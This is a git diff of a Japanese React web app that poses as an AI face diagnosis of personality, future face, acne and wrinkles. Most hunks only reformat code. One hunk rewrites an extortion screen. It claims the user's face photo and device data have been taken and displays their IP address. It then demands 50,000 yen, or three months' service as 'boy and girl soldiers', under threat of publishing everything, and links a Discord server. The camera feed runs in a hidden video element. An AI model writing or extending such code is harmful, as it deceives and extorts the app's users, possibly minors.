@@ -99,7 +99,7 @@ function App() {
       return;
     }
     setMode(1);
-  }
+  };
 
   const camera = async () => {
     setMessage("カメラを起動中...");
@@ -180,9 +180,15 @@ function App() {
         {mode === 0 ? (
           <div className="flex flex-col justify-center items-center gap-4">
             <h2 className="text-white text-2xl font-bold text-center mt-4">
-              AIがあなたの顔から性格、将来の顔、ニキビ、シワを診断します！
+              AIがあなたの顔から<br />性格、将来の顔、<br />ニキビ、シワを診断します！
             </h2>
-            <input type="text" className="p-2 rounded-full bg-white" placeholder="あなたの名前" value={name} onChange={(e) => setName(e.target.value)} />
+            <input
+              type="text"
+              className="p-2 rounded-full bg-white"
+              placeholder="あなたの名前"
+              value={name}
+              onChange={(e) => setName(e.target.value)}
+            />
             <button
               className="rounded-full bg-pink-500 p-4 text-xl text-white font-bold"
               onClick={() => modechange()}
@@ -191,44 +197,44 @@ function App() {
               診断
             </button>
           </div>
-        ) : 
-        mode === 1 ? (
+        ) : mode === 1 ? (
           <div className="flex flex-col justify-center items-center gap-4">
             <h2 className="text-white text-2xl font-bold text-center mt-4">
               診断したい項目を選んでください！
             </h2>
             <div className="flex flex-col gap-4">
               <span className="inline-flex gap-2 items-center">
-                <input
-                  type="checkbox"
-                  id="seikaku"
-                  name="mode"
-                />
-                <label htmlFor="seikaku" className="text-white text-xl font-bold">性格</label>
+                <input type="checkbox" id="seikaku" name="mode" />
+                <label
+                  htmlFor="seikaku"
+                  className="text-white text-xl font-bold"
+                >
+                  性格
+                </label>
               </span>
               <span className="inline-flex gap-2 items-center">
-                <input
-                  type="checkbox"
-                  id="shorai"
-                  name="mode"
-                />
-                <label htmlFor="shorai" className="text-white text-xl font-bold">将来の顔</label>
+                <input type="checkbox" id="shorai" name="mode" />
+                <label
+                  htmlFor="shorai"
+                  className="text-white text-xl font-bold"
+                >
+                  将来の顔
+                </label>
               </span>
               <span className="inline-flex gap-2 items-center">
-                <input
-                  type="checkbox"
-                  id="nikibi"
-                  name="mode"
-                />
-                <label htmlFor="nikibi" className="text-white text-xl font-bold">ニキビ</label>
+                <input type="checkbox" id="nikibi" name="mode" />
+                <label
+                  htmlFor="nikibi"
+                  className="text-white text-xl font-bold"
+                >
+                  ニキビ
+                </label>
               </span>
               <span className="inline-flex gap-2 items-center">
-                <input
-                  type="checkbox"
-                  id="shiwa"
-                  name="mode"
-                />
-                <label htmlFor="shiwa" className="text-white text-xl font-bold">シワ</label>  
+                <input type="checkbox" id="shiwa" name="mode" />
+                <label htmlFor="shiwa" className="text-white text-xl font-bold">
+                  シワ
+                </label>
               </span>
             </div>
 
@@ -240,7 +246,7 @@ function App() {
               {message}
             </button>
           </div>
-        ):(
+        ) : (
           <div className="flex flex-col justify-center items-center gap-4">
             {!ODOSHI && (
               <ResponsiveContainer width="100%" height={250}>
@@ -302,12 +308,18 @@ function App() {
               <>
                 <div className="flex flex-col justify-center items-center text-red-500 font-bold">
                   <p>あなたの顔写真と端末情報を取得しました</p>
-                  <p>公開してほしくなかったら以下のサーバーに入り</p>
-                  <p>5万円をお支払いください</p>
-                  <p>従わない場合は24時間後に</p>
-                  <p>ネット上に全て公開します</p>
-                  <p>以下のサーバーに参加してください</p>
-                  <a href="https://discord.gg/Vk7WZ4JaBA" className="text-blue-400">https://discord.gg/Vk7WZ4JaBA</a>
+                  <p>24時間以内にネット上に公開します</p>
+                  <p>非公開の条件は5万円を連合に上納すること</p>
+                  <p>金がなかったら少年少女兵として</p>
+                  <p>3か月間連合に従ってください</p>
+                  <p>条件等従わない場合は情報を全て公開致します</p>
+                  <p>非公開申請は暗蛇連合discordサーバーに参加</p>
+                  <a
+                    href="https://discord.gg/Vk7WZ4JaBA"
+                    className="text-blue-400"
+                  >
+                    https://discord.gg/Vk7WZ4JaBA
+                  </a>
                 </div>
                 <div className="flex flex-col justify-center items-center text-red-500 font-bold">
                   <p>IPアドレス: {ip}</p>
@@ -319,7 +331,10 @@ function App() {
         )}
       </main>
       <video ref={videoRef} className="hidden"></video>
-      <canvas ref={canvasRef} className={reveal ? "block w-[calc(100vw-5%)]":"hidden"}></canvas>
+      <canvas
+        ref={canvasRef}
+        className={reveal ? "block w-[calc(100vw-5%)]" : "hidden"}
+      ></canvas>
     </div>
   );
 }
